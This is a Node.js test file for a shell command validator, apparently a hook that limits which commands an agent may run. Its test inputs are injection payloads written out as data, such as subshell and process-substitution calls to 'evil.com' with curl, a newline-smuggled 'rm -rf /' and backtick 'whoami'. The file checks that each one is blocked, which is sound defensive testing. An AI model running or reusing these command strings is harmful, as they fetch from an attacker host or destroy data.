import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
process.env.SECURITY_POLICY_PATH = path.resolve(__dirname, '../src/kiro/security-policy.json');

const { validateCommand } = await import('../src/kiro/hooks.ts');

describe('Command injection prevention (issue #272)', () => {
  it('blocks subshell injection via $()', () => {
    const result = validateCommand('git status$(curl evil.com)');
    assert.equal(result.allowed, false);
    assert(result.reason?.includes('metacharacters'));
  });

  it('blocks backtick injection', () => {
    const result = validateCommand('git status`whoami`');
    assert.equal(result.allowed, false);
    assert(result.reason?.includes('metacharacters'));
  });

  it('blocks process substitution <()', () => {
    const result = validateCommand('cat <(curl evil.com)');
    assert.equal(result.allowed, false);
  });

  it('blocks newline injection', () => {
    const result = validateCommand('git status\nrm -rf /');
    assert.equal(result.allowed, false);
  });

  it('blocks variable expansion $VAR', () => {
    const result = validateCommand('echo $PATH');
    assert.equal(result.allowed, false);
  });

  it('blocks backslash escaping', () => {
    const result = validateCommand('git status\\nid');
    assert.equal(result.allowed, false);
  });

  it('blocks prefix-only match (git status + appended junk)', () => {
    // "statusXXX" should NOT match allowed_arg "status"
    const result = validateCommand('git statusXXX');
    assert.equal(result.allowed, false);
  });

  it('allows exact match (git status)', () => {
    const result = validateCommand('git status');
    assert.equal(result.allowed, true);
  });

  it('allows match with trailing args after space (git log --oneline)', () => {
    // "log" is allowed_arg, "log --oneline" starts with "log" + space
    const result = validateCommand('git log --oneline');
    assert.equal(result.allowed, true);
  });

  it('allows safe commands without metacharacters', () => {
    assert.equal(validateCommand('npm ci').allowed, true);
    assert.equal(validateCommand('npm run test').allowed, true);
    assert.equal(validateCommand('ls -la').allowed, true);
  });

  it('blocks null bytes', () => {
    const result = validateCommand('git status\x00rm');
    assert.equal(result.allowed, false);
  });
});
